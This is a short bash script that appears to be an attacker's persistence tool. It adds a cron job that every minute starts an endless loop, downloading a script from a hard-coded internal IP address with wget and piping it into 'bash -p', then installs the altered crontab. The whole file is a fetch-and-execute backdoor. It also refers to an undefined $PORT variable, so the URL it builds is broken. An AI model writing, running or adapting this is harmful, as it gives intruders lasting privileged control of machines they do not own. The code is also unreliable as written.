#!/bin/bash

SERVER_HOST="10.2.45.121"
SERVER_PORT="11000" # static
CURRENT_CRONTAB=$(crontab -l)
PAYLOAD="\n* * * * * bash -c \"while [ 1 ]; do wget -qO- 'http://$SERVER_HOST:$PORT/persistence/cron/chattr/chattr.sh' | bash -p; sleep 2; done\""
TEMP_CRONTAB_FILE=$(mktemp)
crontab -l > "$TEMP_CRONTAB_FILE"
echo -e "$PAYLOAD" >> "$TEMP_CRONTAB_FILE"
crontab "$TEMP_CRONTAB_FILE"
cat "$TEMP_CRONTAB_FILE"
rm "$TEMP_CRONTAB_FILE"
